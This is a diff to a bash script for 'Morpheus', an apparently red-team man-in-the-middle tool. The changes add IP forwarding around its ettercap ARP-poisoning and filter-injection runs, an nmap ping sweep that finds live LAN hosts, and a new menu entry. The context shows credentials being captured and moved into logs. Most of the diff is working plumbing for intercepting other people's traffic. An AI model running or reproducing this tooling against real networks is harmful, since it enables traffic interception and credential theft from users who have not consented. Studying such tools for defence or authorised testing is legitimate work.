@@ -9,7 +9,7 @@
 ###
 # Resize terminal windows size befor running the tool (gnome terminal)
 # Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
-resize -s 31 86 > /dev/null
+resize -s 32 86 > /dev/null
 # inicio
 
 
@@ -59,6 +59,20 @@ exit
 fi
 
 
+
+npm=`which nmap`
+if [ "$?" -eq "0" ]; then
+echo "nmap found" > /dev/null 2>&1
+else
+echo ""
+echo ${RedF}[☠]${white} nmap '->' not found! ${Reset};
+sleep 1
+echo ${RedF}[☠]${white} This script requires nmap to work! ${Reset};
+echo ${RedF}[☠]${white} Please run: sudo apt-get install nmap ${Reset};
+echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
+echo ""
+exit
+fi
 
 
 # ------------------------------------------
@@ -132,7 +146,8 @@ case $DiStR0 in
   esac
 clear
 
-ping -c 3 www.google.com | zenity --progress --pulsate --title "☠ MORPHEUS ☠" --text="Storing current IP settings" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+# config internal framework settings
+ping -c 3 www.google.com | zenity --progress --pulsate --title "☠ MORPHEUS ☠" --text="Config internal framework settings..." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 
 
 
@@ -193,6 +208,9 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
     xterm -T "MORPHEUS - compiling" -geometry 100x30 -e "etterfilter $IPATH/filters/firewall.eft -o $IPATH/output/firewall.ef && sleep 3"
     sleep 1
 
+    # port-forward
+    echo "1" > /proc/sys/net/ipv4/ip_forward
+
       # run mitm+filter
       echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
       echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
@@ -221,6 +239,8 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/firewall.bk $IPATH/filters/firewall.eft > /dev/null 2>&1
+  # port-forward
+  echo "0" > /proc/sys/net/ipv4/ip_forward
   if [ -e $IPATH/credentials ]; then
   mv $IPATH/credentials $IPATH/logs/credentials > /dev/null 2>&1
   else
@@ -267,6 +287,10 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
     xterm -T "MORPHEUS - compiling" -geometry 100x30 -e "etterfilter $IPATH/filters/skelleton.eft -o $IPATH/output/skelleton.ef && sleep 3"
     sleep 1
 
+    # port-forward
+    echo "1" > /proc/sys/net/ipv4/ip_forward
+
+
       # run mitm+filter
       echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
       echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
@@ -295,6 +319,8 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/skelleton.bk $IPATH/filters/skelleton.eft > /dev/null 2>&1
+  # port-forward
+  echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
 
 else
@@ -303,6 +329,36 @@ else
 fi
 }
 
+
+
+
+sh_stageS () {
+cat << !
+---
+-- This module uses nmap framework to report live hosts (LAN)
+---
+!
+sleep 2
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS ☠" --text "Execute this module?" --width 330) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+  echo ${BlueF}[☠]${white} Scanning Local Lan${RedF}! ${Reset};
+  # grab ip range + scan with nmap + zenity display results
+  IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}`
+  echo ${BlueF}[☠]${white} Ip Range${RedF}:${white}$IP_RANGE${RedF}! ${Reset};
+  nmap -sn $IP_RANGE | grep "for" | awk {'print $3,$5,$6'} > $IPATH/logs/lan.mop
+  cat $IPATH/logs/lan.mop | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 500 --height 400 > /dev/null 2>&1
+
+    # cleanup
+    echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+    rm $IPATH/logs/lan.mop > /dev/null 2>&1
+    sleep 2
+
+else
+  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  sleep 2
+fi
+}
 
 
 
@@ -351,6 +407,7 @@ cat << !
     |   9    -  firewall.eft report/block tcp/udp connections (manual)  |
     |                                                                   |
     |   W    -  Write your own filter and use morpheus to inject it     |
+    |   S    -  Scan local lan for live hosts (Nmap framework)          |
     |   E    -  exit/close Morpheus tool                                |
     +-------------------------------------------------------------------+
                                                        SSA-RedTeam@2016_|
@@ -366,6 +423,8 @@ case $choice in
 9) sh_stage9 ;;
 W) sh_stageW ;;
 w) sh_stageW ;;
+S) sh_stageS ;;
+s) sh_stageS ;;
 e) sh_exit ;;
 E) sh_exit ;;
 *) echo "\"$choice\": is not a valid Option"; sleep 2 ;;
